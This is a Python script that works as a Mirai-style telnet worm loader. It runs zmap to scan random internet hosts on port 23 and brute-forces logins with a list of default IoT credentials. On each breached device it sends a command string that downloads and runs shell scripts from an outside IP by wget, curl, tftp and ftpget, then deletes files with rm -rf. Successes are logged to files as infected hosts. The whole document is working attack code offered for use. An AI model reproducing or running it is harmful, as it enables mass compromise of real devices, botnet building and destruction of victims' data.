#!/usr/bin/python3
import threading
import sys, os, re, time, random, socket, select, subprocess

if len(sys.argv) < 3:
    print("Usage: python3 "+sys.argv[0]+" <threads> <output file>")
    sys.exit()

global rekdevice
rekdevice = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.232.225.187/ohsitsvegawellrip.sh; curl -O http://172.232.225.187/ohsitsvegawellrip.sh; chmod 777 ohsitsvegawellrip.sh; sh ohsitsvegawellrip.sh; tftp 172.232.225.187 -c get ohsitsvegawellrip.sh; chmod 777 ohsitsvegawellrip.sh; sh ohsitsvegawellrip.sh; tftp -r ohsitsvegawellrip2.sh -g 172.232.225.187; chmod 777 ohsitsvegawellrip2.sh; sh ohsitsvegawellrip2.sh; ftpget -v -u anonymous -p anonymous -P 21 172.232.225.187 ohsitsvegawellrip1.sh ohsitsvegawellrip1.sh; sh ohsitsvegawellrip1.sh; rm -rf ohsitsvegawellrip.sh ohsitsvegawellrip.sh ohsitsvegawellrip2.sh ohsitsvegawellrip1.sh; rm -rf *"

combo = [
    "root:root",
    "root:",
    "admin:admin",
    "telnet:telnet",
    "support:support",
    "user:user",
    "admin:",
    "admin:password",
    "root:vizxv",
    "root:admin",
    "root:xc3511",
    "root:888888",
    "root:xmhdipc",
    "root:default",
    "root:juantech",
    "root:123456",
    "root:54321",
    "root:12345",
    "root:pass",
    "ubnt:ubnt",
    "root:klv1234",
    "root:Zte521",
    "root:hi3518",
    "root:jvbzd",
    "root:anko",
    "root:zlxx.",
    "root:7ujMko0vizxv",
    "root:7ujMko0admin",
    "root:system",
    "root:ikwb",
    "root:dreambox",
    "root:user",
    "root:realtek",
    "root:00000000",
    "admin:1111111",
    "admin:1234",
    "admin:12345",
    "admin:54321",
    "admin:123456",
    "admin:7ujMko0admin",
    "admin:1234",
    "admin:pass",
    "admin:meinsm",
    "admin:admin1234",
    "root:1111",
    "admin:smcadmin",
    "admin:1111",
    "root:666666",
    "root:password",
    "root:1234",
    "root:klv123",
    "Administrator:admin",
    "service:service",
    "supervisor:supervisor",
    "guest:guest",
    "guest:12345",
    "guest:12345",
    "admin1:password",
    "administrator:1234",
    "666666:666666",
    "888888:888888",
    "tech:tech",
    "mother:fucker"
]

threads = int(sys.argv[1])
output_file = sys.argv[2]

def readUntil(tn, string, timeout=8):
    buf = b''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.1)
        if string.encode() in buf:
            return buf
    raise Exception('TIMEOUT!')

def recvTimeout(sock, size, timeout=8):
    sock.setblocking(0)
    ready = select.select([sock], [], [], timeout)
    if ready[0]:
        data = sock.recv(size)
        return data
    return b""

class router(threading.Thread):
    def __init__ (self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')
    def run(self):
        global fh
        username = ""
        password = ""
        for passwd in combo:
            if ":n/a" in passwd:
                password=""
            else:
                password=passwd.split(":")[1]
            if "n/a:" in passwd:
                username=""
            else:
                username=passwd.split(":")[0]
            try:
                tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tn.settimeout(1)
                tn.connect((self.ip, 23))
            except Exception:
                tn.close()
                break
            try:
                hoho = b''
                hoho += readUntil(tn, b":")
                if b":" in hoho:
                    tn.send(username.encode() + b"\r\n")
                    time.sleep(0.1)
                else:
                    tn.close()
                    return
                hoho = b''
                hoho += readUntil(tn, b":")
                if b":" in hoho:
                    tn.send(password.encode() + b"\r\n")
                    time.sleep(0.1)
                prompt = b''
                prompt += recvTimeout(tn, 40960)
                if b"#" in prompt or b"$" in prompt:
                    for bad in [b"nvalid", b"ailed", b"ncorrect", b"enied", b"error", b"goodbye", b"bad", b"timeout", b"##"]:
                        if bad in prompt.lower():
                            print("\033[32m[\033[31m+\033[32m] [\033[31mFAILED \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, self.ip))
                            tn.close()
                            continue
                    success = True
                else:
                    success = False
                    tn.close()
                if success == True:
                    try:
                        print("\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, self.ip))
                        fh.write(self.ip + ":23 " + username + ":" + password + "\n")
                        fh.flush()
                        tn.send(b"sh\r\n")
                        time.sleep(0.1)
                        tn.send(b"shell\r\n")
                        time.sleep(0.1)
                        tn.send(b"ls /\r\n")
                        time.sleep(1)
                        timeout = 8
                        buf = b''
                        start_time = time.time()
                        while time.time() - start_time < timeout:
                            buf += recvTimeout(tn, 40960)
                            time.sleep(0.1)
                            if b"tmp" in buf and b"unrecognized" not in buf:
                                tn.send(rekdevice.encode() + b"\r\n")
                                print("\033[32m[\033[31m+\033[32m] \033[33mINFECTED \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, self.ip))
                                f = open("infected.txt", "a")
                                f.write(self.ip + ":23 " + username + ":" + password + "\n")
                                f.close()
                                time.sleep(10)
                                tn.close()
                                return
                        tn.close()
                        return
                    except:
                        tn.close()
                else:
                    tn.close()
            except:
                tn.close()

def worker():
    while True:
        cmd = "zmap -p23 -N 10000 -f saddr -q --verbosity=0"
        process = subprocess.Popen(cmd.split(" "), stdout=subprocess.PIPE)
        for line in iter(process.stdout.readline, b''):
            line = line.replace(b"\n", b"")
            threadstarted = False
            while not threadstarted:
                try:
                    thread = router(line)
                    thread.start()
                    threadstarted = True
                except:
                    pass

global fh
fh = open(output_file, "a")
for l in range(threads):
    try:
        t = threading.Thread(target=worker)
        t.start()
    except:
        pass

print("Started " + str(threads) + " scanner threads! Press enter to stop.")
input()
os.kill(os.getpid(), 9)
